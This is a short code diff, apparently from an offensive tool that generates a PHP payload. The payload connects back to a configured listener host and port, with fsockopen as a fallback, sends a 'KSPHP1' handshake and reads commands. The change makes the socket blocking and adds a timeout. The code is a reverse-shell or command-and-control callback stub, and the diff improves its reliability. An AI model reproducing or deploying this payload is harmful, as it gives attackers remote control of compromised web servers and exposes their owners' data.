@@ -36,7 +36,8 @@ $p={self.lport};
 $s=@stream_socket_client('tcp://'.$h.':'.$p,$e,$es,10);
 if(!$s && function_exists('fsockopen')){{$s=@fsockopen($h,$p,$e,$es,10);}}
 if($s){{
-  @stream_set_timeout($s,0);
+  @stream_set_blocking($s,true);
+  @stream_set_timeout($s,30);
   fwrite($s,'KSPHP1');
   $l='';
   while(strlen($l)<4 && !feof($s)){{$c=fread($s,4-strlen($l));if($c===false||$c===''){{break;}}$l.=$c;}}
